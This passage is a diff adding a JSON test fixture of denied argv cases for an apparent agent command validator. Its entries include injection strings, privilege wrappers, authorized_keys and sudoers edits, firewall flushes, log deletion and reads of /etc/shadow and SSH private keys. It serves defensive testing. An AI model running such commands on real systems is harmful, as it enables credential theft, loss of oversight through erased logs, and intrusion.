@@ -1,0 +1,2851 @@
+{
+ "_comment": "Общий набор R28 (E20-T4, T5) для exec.run без оболочки: argv — программа и аргументы словами, cwd — каталог запуска (по умолчанию /). Панель и агент дают одинаковый итог на каждой строке (агент сверх того проверяет пути после ссылок на своей файловой системе). Правила — docs/plan/decisions/E20-agent.md.",
+ "denied": [
+  {
+   "argv": [],
+   "code": "EXEC_UNPARSEABLE"
+  },
+  {
+   "argv": [
+    "echo",
+    "$(id)"
+   ],
+   "code": "EXEC_UNPARSEABLE"
+  },
+  {
+   "argv": [
+    "echo",
+    "$HOME"
+   ],
+   "code": "EXEC_UNPARSEABLE"
+  },
+  {
+   "argv": [
+    "cat",
+    "/etc/sha${X}dow"
+   ],
+   "code": "EXEC_UNPARSEABLE"
+  },
+  {
+   "argv": [
+    "ls",
+    "a\nb"
+   ],
+   "code": "EXEC_UNPARSEABLE"
+  },
+  {
+   "argv": [
+    "ls",
+    "a\tb"
+   ],
+   "code": "EXEC_UNPARSEABLE"
+  },
+  {
+   "argv": [
+    "ls\u0000"
+   ],
+   "code": "EXEC_UNPARSEABLE"
+  },
+  {
+   "argv": [
+    "./run.sh"
+   ],
+   "code": "EXEC_UNPARSEABLE"
+  },
+  {
+   "argv": [
+    "bin/ls"
+   ],
+   "code": "EXEC_UNPARSEABLE"
+  },
+  {
+   "argv": [
+    "../ls"
+   ],
+   "code": "EXEC_UNPARSEABLE"
+  },
+  {
+   "argv": [
+    "."
+   ],
+   "code": "EXEC_UNPARSEABLE"
+  },
+  {
+   "argv": [
+    ".."
+   ],
+   "code": "EXEC_UNPARSEABLE"
+  },
+  {
+   "argv": [
+    "/bin/l*"
+   ],
+   "code": "EXEC_UNPARSEABLE"
+  },
+  {
+   "argv": [
+    "/bin/../bin/ls"
+   ],
+   "code": "EXEC_UNPARSEABLE"
+  },
+  {
+   "argv": [
+    "/bin//ls"
+   ],
+   "code": "EXEC_UNPARSEABLE"
+  },
+  {
+   "argv": [
+    "l s"
+   ],
+   "code": "EXEC_UNPARSEABLE"
+  },
+  {
+   "argv": [
+    "ls;id"
+   ],
+   "code": "EXEC_UNPARSEABLE"
+  },
+  {
+   "argv": [
+    "ls|sh"
+   ],
+   "code": "EXEC_UNPARSEABLE"
+  },
+  {
+   "argv": [
+    "ls&&id"
+   ],
+   "code": "EXEC_UNPARSEABLE"
+  },
+  {
+   "argv": [
+    "`id`"
+   ],
+   "code": "EXEC_UNPARSEABLE"
+  },
+  {
+   "argv": [
+    "ls",
+    "x",
+    "x",
+    "x",
+    "x",
+    "x",
+    "x",
+    "x",
+    "x",
+    "x",
+    "x",
+    "x",
+    "x",
+    "x",
+    "x",
+    "x",
+    "x",
+    "x",
+    "x",
+    "x",
+    "x",
+    "x",
+    "x",
+    "x",
+    "x",
+    "x",
+    "x",
+    "x",
+    "x",
+    "x",
+    "x",
+    "x",
+    "x",
+    "x",
+    "x",
+    "x",
+    "x",
+    "x",
+    "x",
+    "x",
+    "x",
+    "x",
+    "x",
+    "x",
+    "x",
+    "x",
+    "x",
+    "x",
+    "x",
+    "x",
+    "x",
+    "x",
+    "x",
+    "x",
+    "x",
+    "x",
+    "x",
+    "x",
+    "x",
+    "x",
+    "x",
+    "x",
+    "x",
+    "x",
+    "x"
+   ],
+   "code": "EXEC_UNPARSEABLE"
+  },
+  {
+   "argv": [
+    "echo",
+    "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
+   ],
+   "code": "EXEC_UNPARSEABLE"
+  },
+  {
+   "argv": [
+    "bash",
+    "-c",
+    "id"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "sh",
+    "-c",
+    "id"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "sh",
+    "script.sh"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "/bin/bash"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "dash",
+    "-c",
+    "id"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "zsh"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "busybox",
+    "sh"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "env",
+    "FOO=1",
+    "ls"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "env"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "sudo",
+    "ls"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "sudo",
+    "-u",
+    "root",
+    "bash",
+    "-c",
+    "id"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "su",
+    "-",
+    "root"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "doas",
+    "ls"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "pkexec",
+    "ls"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "runuser",
+    "-u",
+    "www-data",
+    "--",
+    "ls"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "nice",
+    "-n",
+    "5",
+    "ls"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "nohup",
+    "ls"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "ionice",
+    "-c",
+    "3",
+    "ls"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "timeout",
+    "5",
+    "ls"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "stdbuf",
+    "-oL",
+    "ls"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "chroot",
+    "/mnt",
+    "ls"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "setsid",
+    "ls"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "nsenter",
+    "-t",
+    "1",
+    "-m",
+    "ls"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "unshare",
+    "-m",
+    "ls"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "flock",
+    "/tmp/l",
+    "ls"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "setpriv",
+    "--reuid",
+    "0",
+    "ls"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "xargs",
+    "rm"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "parallel",
+    "echo"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "watch",
+    "ls"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "script",
+    "-c",
+    "id"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "time",
+    "ls"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "systemd-run",
+    "ls"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "start-stop-daemon",
+    "--start",
+    "--exec",
+    "/bin/ls"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "strace",
+    "ls"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "gdb",
+    "-batch",
+    "-ex",
+    "run",
+    "ls"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "at",
+    "now"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "crontab",
+    "/tmp/x"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "ssh",
+    "localhost",
+    "id"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "scp",
+    "a",
+    "b:c"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "rsync",
+    "-e",
+    "sh",
+    "a",
+    "b"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "tmux",
+    "new"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "screen",
+    "-dm",
+    "ls"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "vim",
+    "-c",
+    ":!id"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "vi",
+    "/etc/hosts"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "emacs",
+    "--batch"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "make",
+    "install"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "git",
+    "pull"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "git",
+    "-c",
+    "core.pager=sh",
+    "log"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "pip",
+    "install",
+    "x"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "npm",
+    "install"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "npx",
+    "x"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "gem",
+    "install",
+    "x"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "cargo",
+    "run"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "go",
+    "run",
+    "x.go"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "composer",
+    "install"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "python3",
+    "-c",
+    "print(1)"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "python3",
+    "manage.py",
+    "check"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "python",
+    "script.py"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "perl",
+    "-e",
+    "1"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "perl",
+    "x.pl"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "ruby",
+    "-e",
+    "1"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "node",
+    "-e",
+    "1"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "node",
+    "app.js"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "php",
+    "-r",
+    "1"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "php",
+    "artisan",
+    "cache:clear"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "lua",
+    "x.lua"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "awk",
+    "{print}",
+    "/etc/hosts"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "gawk",
+    "1",
+    "f"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "java",
+    "-jar",
+    "x.jar"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "/lib64/ld-linux-x86-64.so.2",
+    "/bin/ls"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "ld.so",
+    "/bin/ls"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "find",
+    "/",
+    "-exec",
+    "rm",
+    "{}",
+    ";"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "find",
+    "/tmp",
+    "-execdir",
+    "id",
+    ";"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "find",
+    "/tmp",
+    "-ok",
+    "id",
+    ";"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "tar",
+    "-cf",
+    "x",
+    "--to-command=sh",
+    "/tmp"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "tar",
+    "--checkpoint-action=exec=id",
+    "-cf",
+    "x",
+    "/tmp"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "tar",
+    "-I",
+    "sh",
+    "-xf",
+    "x"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "zip",
+    "-TT",
+    "id",
+    "x.zip",
+    "f"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "sed",
+    "-e",
+    "1e",
+    "/etc/hosts"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "sed",
+    "-i",
+    "s/a/b/",
+    "/etc/nginx/nginx.conf"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "apt-get",
+    "-o",
+    "APT::Update::Pre-Invoke::=id",
+    "update"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "apt",
+    "install",
+    "./x.deb"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "apt-get",
+    "-c",
+    "/tmp/apt.conf",
+    "update"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "dpkg",
+    "-i",
+    "x.deb"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "dpkg",
+    "--unpack",
+    "x.deb"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "docker",
+    "run",
+    "-v",
+    "/:/h",
+    "alpine"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "docker",
+    "exec",
+    "app",
+    "sh"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "docker",
+    "cp",
+    "app:/x",
+    "/y"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "docker",
+    "build",
+    "."
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "docker",
+    "-H",
+    "tcp://x",
+    "ps"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "docker",
+    "--context",
+    "x",
+    "ps"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "docker",
+    "compose",
+    "up",
+    "-d"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "docker",
+    "compose",
+    "exec",
+    "app",
+    "sh"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "docker",
+    "system",
+    "prune",
+    "-af"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "docker",
+    "rm",
+    "-f",
+    "app"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "docker",
+    "kill",
+    "app"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "systemctl",
+    "edit",
+    "nginx"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "systemctl",
+    "set-environment",
+    "LD_PRELOAD=/tmp/x.so"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "systemctl",
+    "link",
+    "/tmp/x.service"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "tee",
+    "-a",
+    "/root/.ssh/authorized_keys"
+   ],
+   "code": "EXEC_SSH_KEYS_OR_SUDO"
+  },
+  {
+   "argv": [
+    "cp",
+    "key",
+    "/home/u/.ssh/authorized_keys"
+   ],
+   "code": "EXEC_SSH_KEYS_OR_SUDO"
+  },
+  {
+   "argv": [
+    "chmod",
+    "777",
+    "/etc/sudoers"
+   ],
+   "code": "EXEC_SSH_KEYS_OR_SUDO"
+  },
+  {
+   "argv": [
+    "mv",
+    "x",
+    "/etc/sudoers.d/u"
+   ],
+   "code": "EXEC_SSH_KEYS_OR_SUDO"
+  },
+  {
+   "argv": [
+    "rm",
+    "/root/.ssh/authorized_keys"
+   ],
+   "code": "EXEC_SSH_KEYS_OR_SUDO"
+  },
+  {
+   "argv": [
+    "nano",
+    "/etc/sudoers"
+   ],
+   "code": "EXEC_SSH_KEYS_OR_SUDO"
+  },
+  {
+   "argv": [
+    "truncate",
+    "-s0",
+    "/root/.ssh/authorized_keys"
+   ],
+   "code": "EXEC_SSH_KEYS_OR_SUDO"
+  },
+  {
+   "argv": [
+    "install",
+    "-m",
+    "644",
+    "k",
+    "/root/.ssh/authorized_keys"
+   ],
+   "code": "EXEC_SSH_KEYS_OR_SUDO"
+  },
+  {
+   "argv": [
+    "cp",
+    "x",
+    "/etc/ssh/sshd_config"
+   ],
+   "code": "EXEC_SSH_KEYS_OR_SUDO"
+  },
+  {
+   "argv": [
+    "ufw",
+    "disable"
+   ],
+   "code": "EXEC_FIREWALL_OFF"
+  },
+  {
+   "argv": [
+    "ufw",
+    "reset"
+   ],
+   "code": "EXEC_FIREWALL_OFF"
+  },
+  {
+   "argv": [
+    "iptables",
+    "-F"
+   ],
+   "code": "EXEC_FIREWALL_OFF"
+  },
+  {
+   "argv": [
+    "iptables",
+    "--flush"
+   ],
+   "code": "EXEC_FIREWALL_OFF"
+  },
+  {
+   "argv": [
+    "iptables",
+    "-P",
+    "INPUT",
+    "ACCEPT"
+   ],
+   "code": "EXEC_FIREWALL_OFF"
+  },
+  {
+   "argv": [
+    "ip6tables",
+    "-F"
+   ],
+   "code": "EXEC_FIREWALL_OFF"
+  },
+  {
+   "argv": [
+    "nft",
+    "flush",
+    "ruleset"
+   ],
+   "code": "EXEC_FIREWALL_OFF"
+  },
+  {
+   "argv": [
+    "nft",
+    "delete",
+    "table",
+    "inet",
+    "filter"
+   ],
+   "code": "EXEC_FIREWALL_OFF"
+  },
+  {
+   "argv": [
+    "systemctl",
+    "stop",
+    "ufw"
+   ],
+   "code": "EXEC_FIREWALL_OFF"
+  },
+  {
+   "argv": [
+    "systemctl",
+    "disable",
+    "nftables"
+   ],
+   "code": "EXEC_FIREWALL_OFF"
+  },
+  {
+   "argv": [
+    "systemctl",
+    "stop",
+    "firewalld"
+   ],
+   "code": "EXEC_FIREWALL_OFF"
+  },
+  {
+   "argv": [
+    "service",
+    "ufw",
+    "stop"
+   ],
+   "code": "EXEC_FIREWALL_OFF"
+  },
+  {
+   "argv": [
+    "firewall-cmd",
+    "--panic-off"
+   ],
+   "code": "EXEC_FIREWALL_OFF"
+  },
+  {
+   "argv": [
+    "iptables",
+    "-X"
+   ],
+   "code": "EXEC_FIREWALL_OFF"
+  },
+  {
+   "argv": [
+    "systemctl",
+    "mask",
+    "iptables"
+   ],
+   "code": "EXEC_FIREWALL_OFF"
+  },
+  {
+   "argv": [
+    "systemctl",
+    "--now",
+    "disable",
+    "ufw"
+   ],
+   "code": "EXEC_FIREWALL_OFF"
+  },
+  {
+   "argv": [
+    "systemctl",
+    "stop",
+    "systemd-journald"
+   ],
+   "code": "EXEC_LOGS_OR_AUDIT"
+  },
+  {
+   "argv": [
+    "systemctl",
+    "disable",
+    "rsyslog"
+   ],
+   "code": "EXEC_LOGS_OR_AUDIT"
+  },
+  {
+   "argv": [
+    "systemctl",
+    "stop",
+    "auditd"
+   ],
+   "code": "EXEC_LOGS_OR_AUDIT"
+  },
+  {
+   "argv": [
+    "service",
+    "rsyslog",
+    "stop"
+   ],
+   "code": "EXEC_LOGS_OR_AUDIT"
+  },
+  {
+   "argv": [
+    "journalctl",
+    "--vacuum-time=1s"
+   ],
+   "code": "EXEC_LOGS_OR_AUDIT"
+  },
+  {
+   "argv": [
+    "journalctl",
+    "--rotate"
+   ],
+   "code": "EXEC_LOGS_OR_AUDIT"
+  },
+  {
+   "argv": [
+    "rm",
+    "-rf",
+    "/var/log"
+   ],
+   "code": "EXEC_LOGS_OR_AUDIT"
+  },
+  {
+   "argv": [
+    "rm",
+    "/var/log/auth.log"
+   ],
+   "code": "EXEC_LOGS_OR_AUDIT"
+  },
+  {
+   "argv": [
+    "truncate",
+    "-s0",
+    "/var/log/syslog"
+   ],
+   "code": "EXEC_LOGS_OR_AUDIT"
+  },
+  {
+   "argv": [
+    "find",
+    "/var/log",
+    "-delete"
+   ],
+   "code": "EXEC_LOGS_OR_AUDIT"
+  },
+  {
+   "argv": [
+    "rm",
+    ".bash_history"
+   ],
+   "code": "EXEC_LOGS_OR_AUDIT"
+  },
+  {
+   "argv": [
+    "auditctl",
+    "-D"
+   ],
+   "code": "EXEC_LOGS_OR_AUDIT"
+  },
+  {
+   "argv": [
+    "auditctl",
+    "-e",
+    "0"
+   ],
+   "code": "EXEC_LOGS_OR_AUDIT"
+  },
+  {
+   "argv": [
+    "systemctl",
+    "mask",
+    "systemd-journald.socket"
+   ],
+   "code": "EXEC_LOGS_OR_AUDIT"
+  },
+  {
+   "argv": [
+    "systemctl",
+    "kill",
+    "rsyslog"
+   ],
+   "code": "EXEC_LOGS_OR_AUDIT"
+  },
+  {
+   "argv": [
+    "mv",
+    "/var/log/auth.log",
+    "/tmp/"
+   ],
+   "code": "EXEC_LOGS_OR_AUDIT"
+  },
+  {
+   "argv": [
+    "cat",
+    "/etc/shadow"
+   ],
+   "code": "EXEC_SECRETS_READ"
+  },
+  {
+   "argv": [
+    "grep",
+    "root",
+    "/etc/shadow"
+   ],
+   "code": "EXEC_SECRETS_READ"
+  },
+  {
+   "argv": [
+    "cat",
+    "/root/.ssh/id_rsa"
+   ],
+   "code": "EXEC_SECRETS_READ"
+  },
+  {
+   "argv": [
+    "cat",
+    "/home/u/.ssh/id_ed25519"
+   ],
+   "code": "EXEC_SECRETS_READ"
+  },
+  {
+   "argv": [
+    "cat",
+    "/etc/ssl/private/server.key"
+   ],
+   "code": "EXEC_SECRETS_READ"
+  },
+  {
+   "argv": [
+    "cat",
+    "/srv/app/.env"
+   ],
+   "code": "EXEC_SECRETS_READ"
+  },
+  {
+   "argv": [
+    "less",
+    "/srv/app/.env.production"
+   ],
+   "code": "EXEC_SECRETS_READ"
+  },
+  {
+   "argv": [
+    "cat",
+    "/proc/1/environ"
+   ],
+   "code": "EXEC_SECRETS_READ"
+  },
+  {
+   "argv": [
+    "cat",
+    "/proc/self/environ"
+   ],
+   "code": "EXEC_SECRETS_READ"
+  },
+  {
+   "argv": [
+    "cp",
+    "/etc/gshadow",
+    "/tmp/"
+   ],
+   "code": "EXEC_SECRETS_READ"
+  },
+  {
+   "argv": [
+    "head",
+    "/root/.bash_history"
+   ],
+   "code": "EXEC_SECRETS_READ"
+  },
+  {
+   "argv": [
+    "cat",
+    "cert.pem"
+   ],
+   "code": "EXEC_SECRETS_READ"
+  },
+  {
+   "argv": [
+    "tail",
+    "/etc/ssl/private/x.pem"
+   ],
+   "code": "EXEC_SECRETS_READ"
+  },
+  {
+   "argv": [
+    "cat",
+    "/etc/letsencrypt/live/x/privkey.pem"
+   ],
+   "code": "EXEC_SECRETS_READ"
+  },
+  {
+   "argv": [
+    "cat",
+    "/etc/nginx/.htpasswd"
+   ],
+   "code": "EXEC_SECRETS_READ"
+  },
+  {
+   "argv": [
+    "cat",
+    "/etc/ssh/ssh_host_ed25519_key"
+   ],
+   "code": "EXEC_SECRETS_READ"
+  },
+  {
+   "argv": [
+    "cat",
+    "/etc//shadow"
+   ],
+   "code": "EXEC_SECRETS_READ"
+  },
+  {
+   "argv": [
+    "cat",
+    "/etc/./shadow"
+   ],
+   "code": "EXEC_SECRETS_READ"
+  },
+  {
+   "argv": [
+    "cat",
+    "/etc/nginx/../shadow"
+   ],
+   "code": "EXEC_SECRETS_READ"
+  },
+  {
+   "argv": [
+    "grep",
+    "--file=/etc/shadow",
+    "x"
+   ],
+   "code": "EXEC_SECRETS_READ"
+  },
+  {
+   "argv": [
+    "dd",
+    "if=/etc/shadow",
+    "of=/tmp/x"
+   ],
+   "code": "EXEC_SECRETS_READ"
+  },
+  {
+   "argv": [
+    "cat",
+    "shadow"
+   ],
+   "code": "EXEC_SECRETS_READ",
+   "cwd": "/etc"
+  },
+  {
+   "argv": [
+    "cat",
+    "id_rsa"
+   ],
+   "code": "EXEC_SECRETS_READ",
+   "cwd": "/root/.ssh"
+  },
+  {
+   "argv": [
